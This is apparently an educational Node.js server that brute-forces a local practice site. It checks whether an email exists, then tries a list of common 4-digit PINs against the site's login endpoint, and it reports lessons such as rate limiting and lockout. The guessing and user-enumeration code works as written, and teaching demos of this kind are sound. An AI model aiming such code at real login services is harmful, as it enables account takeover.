const express = require('express');
const axios = require('axios');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(express.json());
app.use(cors());

// Configuration
const VULNERABLE_SITE_URL = process.env.VULNERABLE_SITE_URL || 'http://localhost:5001';

// EDUCATIONAL: Brute force simulation function
async function simulateBruteForce(email) {
    console.log(`\n🔍 Starting educational brute-force simulation for: ${email}`);
    console.log('⚠️  This demonstrates why 4-digit PINs are insecure');
    
    const results = {
        tested: 0,
        found: false,
        password: null,
        attempts: []
    };
    
    // Test if user exists first
    try {
        const checkResponse = await axios.get(`${VULNERABLE_SITE_URL}/api/check-user/${email}`);
        if (!checkResponse.data.exists) {
            console.log('❌ User not found in vulnerable database');
            return { ...results, error: 'User not found' };
        }
    } catch (error) {
        return { ...results, error: 'Cannot connect to vulnerable site' };
    }
    
    // EDUCATIONAL: Simulate brute force attack
    console.log('⏳ Testing passwords 0000 to 9999...');
    
    // For educational purposes, we'll test a limited range
    // In real attack, this would test all 10,000 combinations
    const testPasswords = [
        '0000', '1111', '1234', '4321', '9999', '0001', 
        '1234', '5678', '2580', '0852', '5555', '7777'
    ];
    
    for (const password of testPasswords) {
        results.tested++;
        
        try {
            const response = await axios.post(`${VULNERABLE_SITE_URL}/api/login`, {
                email,
                password
            }, {
                timeout: 5000
            });
            
            if (response.data.success) {
                console.log(`✅ CRACKED: Password found: ${password}`);
                results.found = true;
                results.password = password;
                break;
            }
            
            // Log every 100th attempt for demonstration
            if (results.tested % 3 === 0) {
                console.log(`   Testing: ${password}... failed`);
            }
            
        } catch (error) {
            // Continue with next password
            continue;
        }
        
        // Add small delay for educational visibility
        await new Promise(resolve => setTimeout(resolve, 50));
    }
    
    console.log(`📊 Results: Tested ${results.tested} passwords, ${results.found ? 'FOUND' : 'NOT FOUND'}`);
    return results;
}

// EDUCATIONAL: Endpoint to demonstrate vulnerability
app.post('/api/demo-brute-force', async (req, res) => {
    try {
        const { email } = req.body;
        
        if (!email) {
            return res.status(400).json({ error: 'Email is required' });
        }
        
        console.log(`\n🎓 Starting educational demonstration for: ${email}`);
        console.log('========================================');
        
        const results = await simulateBruteForce(email);
        
        res.json({
            success: true,
            educational: true,
            message: 'This demonstrates the insecurity of 4-digit PINs',
            results: results,
            security_lessons: [
                '4-digit PINs have only 10,000 possible combinations',
                'Automated tools can test all combinations in minutes',
                'Always use strong passwords (12+ characters, mixed types)',
                'Implement rate limiting on login attempts',
                'Use account lockout after failed attempts',
                'Never store passwords in plain text'
            ]
        });
        
    } catch (error) {
        console.error('Error during demonstration:', error.message);
        res.status(500).json({ 
            error: 'Educational demonstration failed',
            message: error.message 
        });
    }
});

// Serve frontend
app.use(express.static('frontend'));

const PORT = process.env.PORT || 5002;
app.listen(PORT, () => {
    console.log(`\n🎓 EDUCATIONAL SECURITY DEMO running on port ${PORT}`);
    console.log('==========================================');
    console.log('⚠️  This demonstrates security vulnerabilities');
    console.log('⚠️  FOR EDUCATIONAL PURPOSES ONLY');
    console.log('⚠️  Never use this knowledge maliciously');
    console.log('\n📚 What you will learn:');
    console.log('1. Why 4-digit PINs are insecure');
    console.log('2. How brute force attacks work');
    console.log('3. Importance of rate limiting');
    console.log('4. Need for strong password policies');
    console.log('\n🌐 Frontend: http://localhost:' + PORT);
});
